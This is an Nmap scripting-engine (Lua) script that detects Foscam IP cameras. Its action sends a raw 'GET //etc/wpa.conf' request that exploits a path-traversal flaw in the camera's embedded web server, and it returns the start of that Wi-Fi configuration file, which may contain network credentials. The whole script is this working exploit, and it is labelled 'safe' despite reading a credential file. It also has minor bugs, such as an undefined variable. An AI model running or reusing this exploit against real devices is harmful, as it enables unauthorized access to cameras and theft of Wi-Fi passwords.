description = [[A script for identifying the Foscam model IP camera and demonstrating the accountability
of the camera's file system catalogs through the vulnerability of the embedded web server]]
author = "DarkCat(hexvolt1989)"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"default", "safe"}


shortport = require "shortport"
http = require "http"
string = require "string"
nmap = require "nmap"
stdnse = require "stdnse"
portrule = shortport.http
action = function(host, port)
     local socket = nmap.new_socket()
     socket:connect(host, port)
     socket:send("GET //etc/wpa.conf HTTP/1.0\r\n\r\n")
     local response, strout = socket:receive_lines(10)
    local  uri = "/login.htm"
    local  response = http.get(host, port, uri)
    if ( response.status == 200 ) then
      local title = string.match(response.body, "(IP)")
      local resu = found
       if ( title == "IP" ) then
            return strout,resu
        else        
            return "No Foscam IP Camera"
      end
    end
  end
